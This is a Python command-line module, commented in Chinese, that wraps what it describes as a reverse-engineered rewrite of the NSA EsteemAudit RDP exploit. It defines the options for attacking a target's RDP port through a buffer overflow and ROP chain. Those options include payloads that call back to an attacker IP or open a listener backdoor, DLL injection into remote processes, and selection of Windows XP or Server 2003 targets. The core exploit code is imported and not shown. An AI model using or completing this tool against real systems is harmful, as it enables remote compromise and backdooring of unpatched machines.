"""esteem-audit — MS12-020 (ESTEEMAUDIT / ETA) RDP 远程利用。

Python 重写的 NSA EsteemAudit 利用工具 `Esteemaudit-2.1.0.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 RDP/MS12-020 利用流程。
"""

from . import esteem_audit


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def esteem_audit_handle(args):
    """Run the ESTEEMAUDIT exploitation sequence against the supplied host."""
    return esteem_audit.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        packet_timeout=args.packet_timeout,
        max_process_count=args.max_process_count,
        rdplib_hertz=args.rdplib_hertz,
        send_spacebar=args.send_spacebar,
        process_count_to_send_space=args.process_count_to_send_space,
        max_rdplib_error_count=args.max_rdplib_error_count,
        payload=args.payload,
        callback_ip=args.callback_ip,
        callback_port=args.callback_port,
        callback_local_port=args.callback_local_port,
        listen_port=args.listen_port,
        callin_port=args.callin_port,
        architecture=args.architecture,
        migrate_process_dll=args.migrate_process_dll,
        callback_payload_dll=args.callback_payload_dll,
        listen_payload_dll=args.listen_payload_dll,
        target_os=args.target_os,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `esteem-audit` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "esteem-audit",
        help="MS12-020 (ESTEEMAUDIT) RDP 远程利用",
        description="Python 重写的 NSA EsteemAudit (ESTEEMAUDIT / MS12-020) 利用工具 "
                    "Esteemaudit-2.1.0。针对 RDP 3389 端口，通过 RDP 协议栈"
                    "缓冲区溢出与 ROP 链执行任意代码，并可选投递后门。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=3389,
        help="目标 RDP 端口（默认 3389）",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="connect() 调用超时秒（含 egg 回连，默认 60）",
    )
    p.add_argument(
        "--packet-timeout", type=int, default=10,
        help="每个 RDP 包超时秒（默认 10）",
    )
    p.add_argument(
        "--max-process-count", type=int, default=300,
        help="最大 RDP 处理循环次数（默认 300）",
    )
    p.add_argument(
        "--rdplib-hertz", type=int, default=30,
        help="RdpLib 处理周期每秒次数（默认 30）",
    )
    p.add_argument(
        "--send-spacebar", action="store_true", default=True,
        help="是否发送空格键清除法律文本标题（默认启用）",
    )
    p.add_argument(
        "--no-send-spacebar", action="store_false", dest="send_spacebar",
        help="禁用发送空格键",
    )
    p.add_argument(
        "--process-count-to-send-space", type=int, default=3,
        help="清除法律文本标题的处理循环次数（默认 3）",
    )
    p.add_argument(
        "--max-rdplib-error-count", type=int, default=3,
        help="最大 RdpLib 错误次数（默认 3）",
    )
    p.add_argument(
        "--payload",
        choices=["Callback", "Listener"],
        default="Callback",
        help="载荷行为：Callback 连回攻击机，Listener 在目标开监听端口",
    )
    p.add_argument(
        "--callback-ip", metavar="IP",
        help="Callback 模式：载荷连回的 IP 地址",
    )
    p.add_argument(
        "--callback-port", type=int, metavar="PORT",
        help="Callback 模式：载荷连回的端口",
    )
    p.add_argument(
        "--callback-local-port", type=int, metavar="PORT",
        help="Callback 模式：本地监听端口",
    )
    p.add_argument(
        "--listen-port", type=int, metavar="PORT",
        help="Listener 模式：目标监听的端口",
    )
    p.add_argument(
        "--callin-port", type=int, metavar="PORT",
        help="Listener 模式：攻击机连回的端口",
    )
    p.add_argument(
        "--architecture",
        choices=["x86", "x86 64-bit"],
        default="x86",
        help="目标架构（默认 x86）",
    )
    p.add_argument(
        "--migrate-process-dll", metavar="DLL",
        help="用于注入远程进程的 DLL 文件",
    )
    p.add_argument(
        "--callback-payload-dll", metavar="DLL",
        help="用作回连载荷的 DLL 文件",
    )
    p.add_argument(
        "--listen-payload-dll", metavar="DLL",
        help="用作监听载荷的 DLL 文件",
    )
    p.add_argument(
        "--target-os",
        choices=[
            "XPSP0", "XPSP1", "XPSP0|1", "XPSP2", "XPSP3", "XPSP2|3",
            "W2K3SP0", "W2K3SP1", "W2K3SP2", "W2K3SP1|2",
            "Eng|Jpn|64", "Other|64",
        ],
        default="XPSP2|3",
        help="目标操作系统与服务包",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=esteem_audit_handle)
